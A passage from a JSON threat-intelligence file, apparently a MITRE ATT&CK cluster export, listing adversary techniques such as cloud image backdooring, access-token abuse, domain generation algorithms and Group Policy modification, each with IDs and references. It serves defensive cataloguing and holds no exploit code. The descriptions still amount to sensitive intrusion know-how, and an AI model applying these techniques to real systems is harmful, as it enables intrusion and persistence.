      "description": "Amazon Web Service (AWS) Amazon Machine Images (AMI), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored to include malicious code. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)\n\nA tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an attacker has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a web shell.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) Adversaries may also implant Docker images that may be inadvertently used in cloud deployments, which has been reported in some instances of cryptomining botnets.(Citation: ATT Cybersecurity Cryptocurrency Attacks on Cloud) ",
      "meta": {
        "external_id": "T1525",
        "kill_chain": [
          "mitre-attack:persistence"
        ],
        "mitre_platforms": [
          "GCP",
          "Azure",
          "AWS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1525",
          "https://rhinosecuritylabs.com/aws/cloud-container-attack-tool/",
          "https://github.com/RhinoSecurityLabs/ccat",
          "https://www.alienvault.com/blogs/labs-research/making-it-rain-cryptocurrency-mining-attacks-in-the-cloud"
        ]
      },
      "uuid": "4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f",
      "value": "Implant Container Image - T1525"
    },
    {
      "description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ depending on if it's platform-as-a-service (PaaS), infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many different services exist throughout the various cloud providers and can include continuous integration and continuous delivery (CI/CD), Lambda Functions, Azure AD, etc. Adversaries may attempt to discover information about the services enabled throughout the environment.\n\nPacu, an open source AWS exploitation framework, supports several methods for discovering cloud services.(Citation: GitHub Pacu)",
      "meta": {
        "external_id": "T1526",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Azure activity logs",
          "Stackdriver logs",
          "AWS CloudTrail logs"
        ],
        "mitre_platforms": [
          "AWS",
          "GCP",
          "Azure",
          "Azure AD",
          "Office 365",
          "SaaS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1526",
          "https://github.com/RhinoSecurityLabs/pacu"
        ]
      },
      "uuid": "e24fcba8-2557-4442-a139-1ee2f2e784db",
      "value": "Cloud Service Discovery - T1526"
    },
    {
      "description": "Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit the people, their positions, and relationships, that are part of the supply chain. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain)",
      "meta": {
        "external_id": "T1265",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1265"
        ]
      },
      "related": [
        {
          "dest-uuid": "7860e21e-7514-4a3f-8a9d-56405ccfdb0c",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "78e41091-d10d-4001-b202-89612892b6ff",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "59369f72-3005-4e54-9095-3d00efcece73",
      "value": "Identify supply chains - T1265"
    },
    {
      "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
      "meta": {
        "external_id": "T1527",
        "kill_chain": [
          "mitre-attack:defense-evasion",
          "mitre-attack:lateral-movement"
        ],
        "mitre_data_sources": [
          "OAuth audit logs",
          "Office 365 account logs"
        ],
        "mitre_platforms": [
          "SaaS",
          "Office 365"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1527",
          "https://auth0.com/docs/api-auth/why-use-access-tokens-to-secure-apis",
          "https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen",
          "https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens",
          "https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/"
        ]
      },
      "uuid": "27960489-4e7f-461d-a62a-f5c0cb521e4a",
      "value": "Application Access Token - T1527"
    },
    {
      "description": "Firmware is permanent software programmed into the read-only memory of a device. As with other types of software, firmware may be updated over time and have multiple versions. (Citation: Abdelnur Advanced Fingerprinting)",
      "meta": {
        "external_id": "T1258",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1258"
        ]
      },
      "uuid": "6baf6388-d49f-4804-86a4-5837240555cd",
      "value": "Determine firmware version - T1258"
    },
    {
      "description": "Supply chains include the people, processes, and technologies used to move a product or service from a supplier to a consumer. Understanding supply chains may provide an adversary with opportunities to exploit organizational relationships. (Citation: SmithSupplyChain) (Citation: CERT-UKSupplyChain)",
      "meta": {
        "external_id": "T1276",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1276"
        ]
      },
      "related": [
        {
          "dest-uuid": "78e41091-d10d-4001-b202-89612892b6ff",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "59369f72-3005-4e54-9095-3d00efcece73",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "7860e21e-7514-4a3f-8a9d-56405ccfdb0c",
      "value": "Identify supply chains - T1276"
    },
    {
      "description": "Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. (Citation: SEAttackVectors) (Citation: BeachSE2003)",
      "meta": {
        "external_id": "T1268",
        "kill_chain": [
          "mitre-pre-attack:people-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1268"
        ]
      },
      "related": [
        {
          "dest-uuid": "a757670d-d600-48d9-8ae9-601d42c184a5",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "74a3288e-eee9-4f8e-973a-fbc128e033f1",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "af358cad-eb71-4e91-a752-236edc237dae",
      "value": "Conduct social engineering - T1268"
    },
    {
      "description": "An adversary may assess a target's operational security (OPSEC) practices in order to identify targeting options. A target may share different information in different settings or be more of less cautious in different environments. (Citation: Scasny2015) (Citation: EverstineAirStrikes)",
      "meta": {
        "external_id": "T1296",
        "kill_chain": [
          "mitre-pre-attack:people-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1296"
        ]
      },
      "uuid": "d69c3e06-8311-4093-8e3e-0a8e06b15d92",
      "value": "Assess targeting options - T1296"
    },
    {
      "description": "An adversary will assess collected information such as software/hardware versions, vulnerabilities, patch level, etc.  They will analyze technical scanning results to identify weaknesses in the confirmation or architecture. (Citation: SurveyDetectionStrategies) (Citation: CyberReconPaper) (Citation: RSA-APTRecon) (Citation: FireEyeAPT28)",
      "meta": {
        "external_id": "T1287",
        "kill_chain": [
          "mitre-pre-attack:technical-weakness-identification"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1287"
        ]
      },
      "uuid": "773950e1-090c-488b-a480-9ff236312e31",
      "value": "Analyze data collected - T1287"
    },
    {
      "description": "Social Engineering is the practice of manipulating people in order to get them to divulge information or take an action. (Citation: SEAttackVectors) (Citation: BeachSE2003)",
      "meta": {
        "external_id": "T1279",
        "kill_chain": [
          "mitre-pre-attack:organizational-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1279"
        ]
      },
      "related": [
        {
          "dest-uuid": "af358cad-eb71-4e91-a752-236edc237dae",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        },
        {
          "dest-uuid": "74a3288e-eee9-4f8e-973a-fbc128e033f1",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "related-to"
        }
      ],
      "uuid": "a757670d-d600-48d9-8ae9-601d42c184a5",
      "value": "Conduct social engineering - T1279"
    },
    {
      "description": "On Android, an adversary could call standard operating system APIs from a malicious application to gather call log data, or with escalated privileges could directly access files containing call log data.\n\nOn iOS, applications do not have access to the call log, so privilege escalation would be required in order to access the data.",
      "meta": {
        "external_id": "APP-13",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1433",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-13.html"
        ]
      },
      "uuid": "79eec66a-9bd0-4a3f-ac82-19159e94bd44",
      "value": "Access Call Log - T1433"
    },
    {
      "description": "Backup infrastructure allows an adversary to recover from environmental and system failures. It also facilitates recovery or movement to other infrastructure if the primary infrastructure is discovered or otherwise is no longer viable. (Citation: LUCKYCAT2012)",
      "meta": {
        "external_id": "T1339",
        "kill_chain": [
          "mitre-pre-attack:establish-&-maintain-infrastructure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1339"
        ]
      },
      "uuid": "a425598d-7c19-40f7-9aa3-ac20f0d5c2b2",
      "value": "Create backup infrastructure - T1339"
    },
    {
      "description": "An adversary with control of a target's Google account can use the Google Play Store's remote installation capability to install apps onto the Android devices associated with the Google account as described in  (Citation: Oberheide-RemoteInstall),  (Citation: Konoth). However, only applications that are available for download through the Google Play Store can be remotely installed using this technique.\n\nDetection: An EMM/MDM or mobile threat protection solution can identify the presence of unwanted or known insecure or malicious apps on devices.\n\nPlatforms: Android",
      "meta": {
        "external_id": "T1443",
        "refs": [
          "https://attack.mitre.org/techniques/T1443"
        ]
      },
      "related": [
        {
          "dest-uuid": "d9db3d46-66ca-44b4-9daa-1ef97cb7465a",
          "tags": [
            "estimative-language:likelihood-probability=\"almost-certain\""
          ],
          "type": "revoked-by"
        }
      ],
      "uuid": "831e3269-da49-48ac-94dc-948008e8fd16",
      "value": "Remotely Install Application - T1443"
    },
    {
      "description": "**This technique has been deprecated by [Input Capture](https://attack.mitre.org/techniques/T1417), [Input Injection](https://attack.mitre.org/techniques/T1516), and [Input Prompt](https://attack.mitre.org/techniques/T1411).**\n\nA malicious app could abuse Android's accessibility features to capture sensitive data or perform other malicious actions.(Citation: Skycure-Accessibility)\n\nAdversaries may abuse accessibility features on Android to emulate a user's clicks, for example to steal money from a user's bank account.(Citation: android-trojan-steals-paypal-2fa)(Citation: banking-trojans-google-play)\n\nAdversaries may abuse accessibility features on Android devices to evade defenses by repeatedly clicking the \"Back\" button when a targeted app manager or mobile security app is launched, or when strings suggesting uninstallation are detected in the foreground. This effectively prevents the malicious application from being uninstalled.(Citation: android-trojan-steals-paypal-2fa)",
      "meta": {
        "external_id": "T1453",
        "kill_chain": [
          "mitre-mobile-attack:collection",
          "mitre-mobile-attack:credential-access",
          "mitre-mobile-attack:impact",
          "mitre-mobile-attack:defense-evasion"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1453",
          "https://www.skycure.com/blog/accessibility-clickjacking/",
          "https://www.welivesecurity.com/2018/12/11/android-trojan-steals-money-paypal-accounts-2fa/",
          "https://www.welivesecurity.com/2018/10/24/banking-trojans-continue-surface-google-play/"
        ]
      },
      "uuid": "2204c371-6100-4ae0-82f3-25c07c29772a",
      "value": "Abuse Accessibility Features - T1453"
    },
    {
      "description": "An adversary could call standard operating system APIs from a malicious application to gather calendar entry data, or with escalated privileges could directly access files containing calendar data.",
      "meta": {
        "external_id": "APP-13",
        "kill_chain": [
          "mitre-mobile-attack:collection"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1435",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-13.html"
        ]
      },
      "uuid": "62adb627-f647-498e-b4cc-41499361bacb",
      "value": "Access Calendar Entries - T1435"
    },
    {
      "description": "A payload is the part of the malware which performs a malicious action. The adversary may create custom payloads when none exist with the needed capability or when targeting a specific environment. (Citation: APT1)",
      "meta": {
        "external_id": "T1345",
        "kill_chain": [
          "mitre-pre-attack:build-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1345"
        ]
      },
      "uuid": "fddd81e9-dd3d-477e-9773-4fb8ae227234",
      "value": "Create custom payloads - T1345"
    },
    {
      "description": "If network traffic between the mobile device and a remote server is not securely protected, then an attacker positioned on the network may be able to manipulate network communication without being detected. For example, FireEye researchers found in 2014 that 68% of the top 1,000 free applications in the Google Play Store had at least one Transport Layer Security (TLS) implementation vulnerability potentially opening the applications' network traffic to man-in-the-middle attacks (Citation: FireEye-SSL).",
      "meta": {
        "external_id": "APP-1",
        "kill_chain": [
          "mitre-mobile-attack:network-effects"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1463",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-1.html",
          "https://www.fireeye.com/blog/threat-research/2014/08/ssl-vulnerabilities-who-listens-when-android-applications-talk.html"
        ]
      },
      "uuid": "d731c21e-f27d-4756-b418-0e2aaabd6d63",
      "value": "Manipulate Device Communication - T1463"
    },
    {
      "description": "Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. \n\nThey may use commonly open ports such as\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol.",
      "meta": {
        "external_id": "T1436",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control",
          "mitre-mobile-attack:exfiltration"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1436"
        ]
      },
      "uuid": "3911658a-6506-4deb-9ab4-595a51ae71ad",
      "value": "Commonly Used Port - T1436"
    },
    {
      "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or “gibberish” strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
      "meta": {
        "external_id": "T1483",
        "kill_chain": [
          "mitre-attack:command-and-control"
        ],
        "mitre_data_sources": [
          "Process use of network",
          "Packet capture",
          "Network device logs",
          "Netflow/Enclave netflow",
          "DNS records"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1483",
          "http://go.cybereason.com/rs/996-YZT-709/images/Cybereason-Lab-Analysis-Dissecting-DGAs-Eight-Real-World-DGA-Variants.pdf",
          "https://umbrella.cisco.com/blog/2016/10/10/domain-generation-algorithms-effective/",
          "https://unit42.paloaltonetworks.com/threat-brief-understanding-domain-generation-algorithms-dga/",
          "http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html",
          "https://blogs.akamai.com/2018/01/a-death-match-of-domain-generation-algorithms.html",
          "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html",
          "https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/",
          "https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/",
          "http://csis.pace.edu/~ctappert/srd2017/2017PDF/d4.pdf",
          "https://arxiv.org/pdf/1611.00791.pdf"
        ]
      },
      "uuid": "54456690-84de-4538-9101-643e26437e09",
      "value": "Domain Generation Algorithms - T1483"
    },
    {
      "description": "Adversaries can communicate using cellular networks rather than enterprise Wi-Fi in order to bypass enterprise network monitoring systems. Adversaries may also communicate using other non-Internet Protocol mediums such as SMS, NFC, or Bluetooth to bypass network monitoring systems.",
      "meta": {
        "external_id": "APP-30",
        "kill_chain": [
          "mitre-mobile-attack:command-and-control",
          "mitre-mobile-attack:exfiltration"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1438",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-30.html"
        ]
      },
      "uuid": "b3c2e5de-0941-4b57-ba61-af029eb5517a",
      "value": "Alternate Network Mediums - T1438"
    },
    {
      "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
      "meta": {
        "external_id": "T1493",
        "kill_chain": [
          "mitre-attack:impact"
        ],
        "mitre_data_sources": [
          "Packet capture",
          "Network protocol analysis"
        ],
        "mitre_platforms": [
          "Linux",
          "macOS",
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1493",
          "https://content.fireeye.com/apt/rpt-apt38",
          "https://www.justice.gov/opa/press-release/file/1092091/download"
        ]
      },
      "uuid": "cc1e737c-236c-4e3b-83ba-32039a626ef8",
      "value": "Transmitted Data Manipulation - T1493"
    },
    {
      "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be easily facilitated using restoration from VM or data storage snapshots through the cloud management dashboard. Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the latter types often reset upon stop/restart of the VM.(Citation: Tech Republic - Restore AWS Snapshots)(Citation: Google - Restore Cloud Snapshot)",
      "meta": {
        "external_id": "T1536",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Azure OS logs",
          "AWS CloudTrail logs",
          "Azure activity logs",
          "Stackdriver logs",
          "AWS OS logs"
        ],
        "mitre_platforms": [
          "AWS",
          "GCP",
          "Azure"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1536",
          "https://www.techrepublic.com/blog/the-enterprise-cloud/backing-up-and-restoring-snapshots-on-amazon-ec2-machines/",
          "https://cloud.google.com/compute/docs/disks/restore-and-delete-snapshots"
        ]
      },
      "uuid": "3b4121aa-fc8b-40c8-ac4f-afcb5838b72c",
      "value": "Revert Cloud Instance - T1536"
    },
    {
      "description": "Callbacks are malware communications seeking instructions. An adversary will test their malware to ensure the appropriate instructions are conveyed and the callback software can be reached. (Citation: LeeBeaconing)",
      "meta": {
        "external_id": "T1356",
        "kill_chain": [
          "mitre-pre-attack:test-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1356"
        ]
      },
      "uuid": "0649fc36-72a0-40a0-a2f9-3fc7e3231ad6",
      "value": "Test callback functionality - T1356"
    },
    {
      "description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
      "meta": {
        "external_id": "T1538",
        "kill_chain": [
          "mitre-attack:discovery"
        ],
        "mitre_data_sources": [
          "Office 365 audit logs",
          "Azure activity logs",
          "Stackdriver logs",
          "AWS CloudTrail logs"
        ],
        "mitre_platforms": [
          "AWS",
          "GCP",
          "Azure",
          "Azure AD",
          "Office 365"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1538",
          "https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard",
          "https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-aws-console-sign-in-events.html"
        ]
      },
      "uuid": "e49920b0-6c54-40c1-9571-73723653205f",
      "value": "Cloud Service Dashboard - T1538"
    },
    {
      "description": "Removable media containing malware can be injected in to a supply chain at large or small scale. It can also be physically placed for someone to find or can be sent to someone in a more targeted manner. The intent is to have the user utilize the removable media on a system where the adversary is trying to gain access. (Citation: USBMalwareAttacks) (Citation: FPDefendNewDomain) (Citation: ParkingLotUSB)",
      "meta": {
        "external_id": "T1379",
        "kill_chain": [
          "mitre-pre-attack:stage-capabilities"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1379"
        ]
      },
      "uuid": "2f442206-2983-4fc2-93fd-0a828e026412",
      "value": "Disseminate removable media - T1379"
    },
    {
      "description": "Spearphishing for information is a specific variant of spearphishing. Spearphishing for information is different from other forms of spearphishing in that it it doesn't leverage malicious code. All forms of spearphishing are elctronically delivered social engineering targeted at a specific individual, company, or industry. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials, without involving malicious code. Spearphishing for information frequently involves masquerading as a source with a reason to collect information (such as a system administrator or a bank) and providing a user with a website link to visit. The given website often closely resembles a legitimate site in appearance and has a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Spearphishing for information may also try to obtain information directly through the exchange of emails, instant messengers or other electronic conversation means. (Citation: ATTACKREF GRIZZLY STEPPE JAR)",
      "meta": {
        "external_id": "T1397",
        "kill_chain": [
          "mitre-pre-attack:technical-information-gathering"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1397"
        ]
      },
      "uuid": "b182f29c-2505-4b32-a000-0440ef189f59",
      "value": "Spearphishing for Information - T1397"
    },
    {
      "description": "An SMS message could contain content designed to exploit vulnerabilities in the SMS parser on the receiving device. For example, Mulliner and Miller demonstrated such an attack against the iPhone in 2009 as described in  (Citation: Forbes-iPhoneSMS).\n\nAn SMS message could also contain a link to a web site containing malicious content designed to exploit the device web browser.\n\nAs described by SRLabs in  (Citation: SRLabs-SIMCard), vulnerable SIM cards may be remotely exploited and reprogrammed via SMS messages.\n\nPlatforms: Android, iOS",
      "meta": {
        "external_id": "T1454",
        "refs": [
          "https://attack.mitre.org/techniques/T1454"
        ]
      },
      "related": [],
      "uuid": "0bcc4ec1-a897-49a9-a9ff-c00df1d1209d",
      "value": "Malicious SMS Message - T1454"
    },
    {
      "description": "As further described in [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Somewhat related, adversaries could also identify and exploit inadvertently present vulnerabilities. In many cases, it may be difficult to be certain whether exploitable functionality is due to malicious intent or simply inadvertent mistake.\n\nRelated PRE-ATT&CK techniques include:\n\n* [Identify vulnerabilities in third-party software libraries](https://attack.mitre.org/techniques/T1389) - Third-party libraries incorporated into mobile apps could contain malicious behavior, privacy-invasive behavior, or exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or could exploit inadvertent vulnerabilities. For example, Ryan Welton of NowSecure identified exploitable remote code execution vulnerabilities in a third-party advertisement library (Citation: NowSecure-RemoteCode). Grace et al. identified security issues in mobile advertisement libraries (Citation: Grace-Advertisement).\n* [Distribute malicious software development tools](https://attack.mitre.org/techniques/T1394) - As demonstrated by the XcodeGhost attack (Citation: PaloAlto-XcodeGhost1), app developers could be provided with modified versions of software development tools (e.g. compilers) that automatically inject malicious or exploitable code into applications.",
      "meta": {
        "external_id": "APP-6",
        "kill_chain": [
          "mitre-mobile-attack:initial-access"
        ],
        "mitre_platforms": [
          "Android",
          "iOS"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1474",
          "https://pages.nist.gov/mobile-threat-catalogue/application-threats/APP-6.html",
          "https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/",
          "http://researchcenter.paloaltonetworks.com/2015/09/novel-malware-xcodeghost-modifies-xcode-infects-apple-ios-apps-and-hits-app-store/"
        ]
      },
      "uuid": "0d95940f-9583-4e0f-824c-a42c1be47fad",
      "value": "Supply Chain Compromise - T1474"
    },
    {
      "description": "An adversary could wipe the entire device contents or delete specific files. A malicious application could obtain and abuse Android device administrator access to wipe the entire device.(Citation: Android DevicePolicyManager 2019) Access to external storage directories or escalated privileges could be used to delete individual files.",
      "meta": {
        "external_id": "T1447",
        "kill_chain": [
          "mitre-mobile-attack:impact"
        ],
        "mitre_platforms": [
          "Android"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1447",
          "https://developer.android.com/reference/android/app/admin/DevicePolicyManager.html"
        ]
      },
      "uuid": "8e27551a-5080-4148-a584-c64348212e4f",
      "value": "Delete Device Data - T1447"
    },
    {
      "description": "Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. \n\nGroup policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \n\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\n\nMalicious GPO modifications can be used to implement [Scheduled Task](https://attack.mitre.org/techniques/T1053), [Disabling Security Tools](https://attack.mitre.org/techniques/T1089), [Remote File Copy](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1035) and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs) Publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)\n",
      "meta": {
        "external_id": "T1484",
        "kill_chain": [
          "mitre-attack:defense-evasion"
        ],
        "mitre_data_sources": [
          "Windows event logs"
        ],
        "mitre_platforms": [
          "Windows"
        ],
        "refs": [
          "https://attack.mitre.org/techniques/T1484",
          "https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/",
          "https://adsecurity.org/?p=2716",
          "https://wald0.com/?p=179",
          "http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/",
          "https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf",
          "https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/",
          "http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/"
        ]
      },
      "uuid": "ebb42bbe-62d7-47d7-a55f-3b08b61d792d",
      "value": "Group Policy Modification - T1484"
    },
    {
